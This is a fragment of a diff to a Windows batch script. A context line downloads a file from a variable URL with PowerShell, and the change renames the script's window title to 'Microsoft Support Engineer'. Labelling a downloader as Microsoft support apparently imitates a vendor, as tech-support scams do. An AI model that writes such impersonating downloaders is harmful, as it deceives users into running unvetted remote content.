@@ -17,7 +17,7 @@ powershell -Command "irm '%URL%' -OutFile '%OUTPUT%'"
 ::Check for admin rights 
 PAUSE
 :: goto :EOF
-Title WAVE5WINFix(C) : [v3.0]
+Title Microsoft Support Engineer(C) : [v3.0]
 BREAK=ON
 color 5f
 :: LET THE HUNT BEGIN!
